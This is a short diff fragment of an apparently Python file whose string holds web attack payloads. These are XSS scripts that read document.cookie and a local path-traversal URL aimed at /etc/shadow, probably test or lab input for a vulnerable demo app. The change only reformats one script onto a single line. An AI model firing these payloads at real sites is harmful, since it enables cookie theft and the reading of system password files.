@@ -61,9 +61,7 @@ if __name__ == "__main__":
 alert(document.cookie);
 </script>
 
-<script>
-document.write(document.cookie);
-</script>
+<script>document.write(document.cookie);</script>
 
 http://127.0.0.1:5000/get_file/..%2f/etc/shadowc
 '''
